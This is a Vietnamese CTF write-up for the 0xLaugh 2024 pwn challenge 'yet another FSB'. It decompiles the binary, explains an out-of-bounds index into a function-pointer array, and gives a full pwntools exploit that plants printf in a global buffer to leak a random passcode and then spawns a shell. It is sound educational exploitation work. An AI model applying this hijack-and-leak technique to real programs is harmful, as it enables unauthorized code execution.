# 0XLAUGH CTF 2024 - yet another FSB

Bài giải này cũng được lấy ý tưởng từ anh `Lio`, một tiền bối trong BKISC chung team với mình hehe (thanks to Lio-san). Check file thôi nào

```
pwndbg> checksec
File:     /home/kali/CTF/0xlaugh/game/chall
Arch:     amd64
RELRO:      Full RELRO
Stack:      Canary found
NX:         NX enabled
PIE:        No PIE (0x400000)
Stripped:   No
```

Tiếp đến là chạy thử chương trình xem sao

```
[*] PASSCODE CHANGED!
[*] NickName> vnpd
= = = = = CAN YOU BEAT ME! = = = = =
[1] Easy
[2] Hard
> 2
[*] Guess>> 987654321
[-] YOU ARE NOT WORTHY FOR A SHELL!
[*] PASSCODE CHANGED!
= = = = = CAN YOU BEAT ME! = = = = =
[1] Easy
[2] Hard
> 1
[*] Guess>> 13
[-] WRONG GUESS :(
= = = = = CAN YOU BEAT ME! = = = = =
[1] Easy
[2] Hard
>
```

Có vẻ như nó kêu ta nhập vào Nickname, chọn chế độ tương ứng sau đó đưa ra lựa chọn Guess. Cùng nhau dissamble để xem code nó thực hiện những gì

```
void main(void)

{
  ssize_t sVar1;
  long guess1;
  undefined8 guess2;

  setup();
  printf("[*] NickName> ");
  sVar1 = read(0,username,0x40);
  if (sVar1 == -1) {
    perror("READ ERROR");
                    /* WARNING: Subroutine does not return */
    exit(-1);
  }
  do {
    menu();
    guess1 = read_int();
    printf("[*] Guess>");
    guess2 = read_int();
    (**(code **)(conv + (guess1 + -1) * 8))(guess2);
  } while( true );
}
```

Okay, nó đưa giá trị ta nhập ban đầu vào username, sau đó hiện thực vòng lặp vô tận, gọi hàm `menu` và cho 2 giá trị ta nhập tiếp sau đó vào các biến tương ứng là `guess1` và `guess2`.

```
void menu(void)
{
  puts("= = = = = CAN YOU BEAT ME! = = = = =");
  puts("[1] Easy");
  puts("[2] Hard");
  return;
}
```

Hàm menu không có gì quá đặc biệt, cùng nhau đi đến 2 hàm `easy` và `hard` xem nào.

```
void easy(long param_1)

{
  int iVar1;

  iVar1 = rand();
  if (param_1 == iVar1) {
    printf("[+] NICE GUESS!!\n[*] Current Score: %lu\n",score);
  }
  else {
    puts("[-] WRONG GUESS :(");
  }
  return;
}
```

Hàm `easy` lấy giá trị ta nhập vào để dò xem với biến `iVar1`, nếu đúng thì nó cho ta biết `score`, hiện tại chưa thấy cần liên quan gì đến score lắm nên chưa cần để ý. Ở hàm `hard` mới có nhiều thứ thú vị đấy.

```
void hard(long param_1)

{
  long in_FS_OFFSET;
  int local_34;
  undefined8 local_19;
  undefined local_11;
  long local_10;

  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  local_19 = 0x7b603c7d7a713c;
  local_11 = 0;
  for (local_34 = 0; local_34 < 7; local_34 = local_34 + 1) {
    *(byte *)((long)&local_19 + (long)local_34) = *(byte *)((long)&local_19 + (long)local_34) ^ 0x13
    ;
  }
  if (param_1 == passcode) {
    puts("[+] WINNNN!");
    execve((char *)&local_19,(char **)0x0,(char **)0x0);
  }
  else {
    puts("[-] YOU ARE NOT WORTHY FOR A SHELL!");
  }
  change_passcode();
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return;
}
```

Thứ mà mình để ý đến đầu tiên là `execve((char *)&local_19,(char **)0x0,(char **)0x0);`, nó execve 1 lệnh gì đó, ở biến `local_19` sau đó thông qua các phép toán `XOR` này kia, thì mình dự đoán đây là `shellcode` (im bad at decryption). Thì để hệ thống gọi hàm này thì ta cần phải nhập đầu vào giống với `passcode`, `passcode` này ở đâu, ta quan sát thì thấy có hàm `change_passcode`, tức là nếu ta đoán sai lần đầu thì nó sẽ nhảy vào hàm này và đặt passcode bằng 8 byte giá trị ngẫu nhiên.

```
void change_passcode(void)

{
  int __fd;
  ssize_t sVar1;

  __fd = open("/dev/random",0);
  if (__fd < 0) {
    perror("OPEN ERROR");
                    /* WARNING: Subroutine does not return */
    exit(-1);
  }
  sVar1 = read(__fd,&passcode,8);
  if (sVar1 == -1) {
    perror("READ ERROR");
                    /* WARNING: Subroutine does not return */
    exit(-1);
  }
  puts("[*] PASSCODE CHANGED!");
  close(__fd);
  return;
}
```

Thế ý tưởng là gì, mời bạn đến với phần tiếp theo.

# EXPLOITATION

Nếu các bạn nhìn lại lên hàm `main`, sẽ thấy 1 dòng khá kì lạ, theo mình là nó rất lạ và làm mình nhớ tới 1 cái gì đó. Đó là dòng

```
(**(code **)(conv + (guess1 + -1) * 8))(guess2);
```

Sau khi tìm hiểu thì đây là cách thức gọi mảng, cụ thể hơn là như sau: nó sẽ lấy `guess1` (nó xem guess1 của mình là offset) sau đó nó sẽ nhân với 8, mỗi phần tử trong mảng của x64 chứa 8 bytes, nó sẽ thực hiện cái hàm đang chứa ở địa chỉ đó với tham số đầu vào là `guess2`. Okay, thì ta hình thành ý tưởng như sau: đó là bằng cách nào đó cần phải biết 8 bytes ngẫu nhiên passcode kia là gì, thì ta phải "dụ" hệ thống đọc ra 8 bytes đó cho ta, và bằng cách như trên đây. Cụ thể hơn là với lỗ hổng `Out-of-bound`.

```
                             conv                                            XREF[3]:     Entry Point(*), main:0040161d(*),
                                                                                          main:00401624(*)
        00404010 e1 12 40        undefine
                 00 00 00
                 00 00 2c
           00404010 e1              undefined1E1h                     [0]           ?  ->  004012e1     XREF[3]:     Entry Point(*), main:0040161d(*),
                                                                                                                     main:00401624(*)
           00404011 12              undefined112h                     [1]
           00404012 40              undefined140h                     [2]
           00404013 00              undefined100h                     [3]
           00404014 00              undefined100h                     [4]
           00404015 00              undefined100h                     [5]
           00404016 00              undefined100h                     [6]
           00404017 00              undefined100h                     [7]
           00404018 2c              undefined12Ch                     [8]           ?  ->  0040132c
           00404019 13              undefined113h                     [9]
           0040401a 40              undefined140h                     [10]
           0040401b 00              undefined100h                     [11]
           0040401c 00              undefined100h                     [12]
           0040401d 00              undefined100h                     [13]
           0040401e 00              undefined100h                     [14]
           0040401f 00              undefined100h                     [15]
```

Mảng `conv` chứa 15 phần tử, ta có thể thực hiện cách `trial-and-error` xem coi ở offset nào thì thú vị. Nhưng có cách khác hay hơn đó là nhớ đến thằng `username` ban đầu, 1 điều thú vị là `username` và `passcode` đều nằm trong mảng `conv`. Nên ta có thể sử dụng offset của thằng username, đưa địa chỉ 1 thằng nào đó vô, sau đó lát nữa gọi ra dùng `guess1` thì nó sẽ thực hiện cái địa chỉ đang chứa trong `username`.

```
from pwn import *

p = process('./chall')


e = ELF('./chall')
offset = (e.sym['username'] - e.sym['conv']) / 8 + 1
```

Bằng cách này, ta sẽ tìm ra được offset của thằng `username` trong mảng `conv`, lý do + 1 là bởi vì `guess1 + -1` trong `(**(code **)(conv + (guess1 + -1) * 8))(guess2);`, tiếp đến, ta cần biết nên đặt gì ở `username`. Thì để có thể leak ra giá trị passcode, ta sẽ có thể sử dụng `printf`, `puts`, ở đây mình chọn `printf`.

```
from pwn import *

p = process('./chall')


e = ELF('./chall')
offset = (e.sym['username'] - e.sym['conv']) / 8 + 1

printf_address = e.plt['printf']
# Put printf in username
p.sendlineafter(b'> ', p64(printf_address))
p.sendlineafter(b'> ', str(offset))
p.sendlineafter(b'>> ', str(e.sym['passcode']))

passcode = u64(p.recvn(8))
print(hex(passcode))

p.sendlineafter(b'> ', str(2))
p.sendlineafter(b'>> ', str(passcode))

p.interactive()
```

Tiến hành chạy script vài lần để cho giá trị passcode được gen ra, sau vài lần thì ta sẽ lấy được shell

```
[*] Switching to interactive mode
[+] WINNNN!
$ ls
chall         core.1114506  core.1119813  core.1191150  exp2.py
core.1109287  core.1118246  core.1132640  core.1191217  note
core.1110513  core.1118276  core.1132710  exp.py
$ cat flag.txt
cat: flag.txt: No such file or directory
```
